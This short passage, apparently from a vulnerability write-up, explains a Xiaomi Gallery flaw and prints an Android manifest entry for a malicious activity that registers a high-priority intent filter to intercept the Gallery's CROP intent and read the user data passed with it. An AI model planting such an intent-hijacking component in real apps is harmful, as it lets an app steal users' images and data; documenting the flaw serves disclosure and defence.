**Code Snippet (Xiaomi Gallery Vulnerability):**

The provided code snippet demonstrates how a malicious app can intercept the Gallery app's intent and gain access to user data.

```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.android.camera.action.CROP" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>
```

This code defines an activity in a malicious app that listens for the `com.android.camera.action.CROP` intent. When the Gallery app launches this intent, the malicious app intercepts it and can access the data provided in the intent.
